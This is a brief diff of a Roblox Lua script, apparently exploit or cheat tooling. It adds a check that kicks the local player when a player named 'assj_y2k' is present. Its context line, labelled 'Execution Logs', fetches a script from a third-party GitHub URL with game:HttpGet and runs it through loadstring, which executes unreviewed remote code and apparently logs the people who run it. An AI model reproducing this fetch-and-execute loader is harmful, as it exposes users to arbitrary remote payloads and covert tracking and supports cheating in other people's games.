@@ -1,5 +1,9 @@
 ------------------------------------------------------------------
 
+if game.Players:FindFirstChild("assj_y2k") then
+game:GetService("Players").LocalPlayer:Kick("YOU'VE BEEN BLACKLISTED | USH ")
+end
+
 --Execution Logs
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/script-execution/main/s",true))()
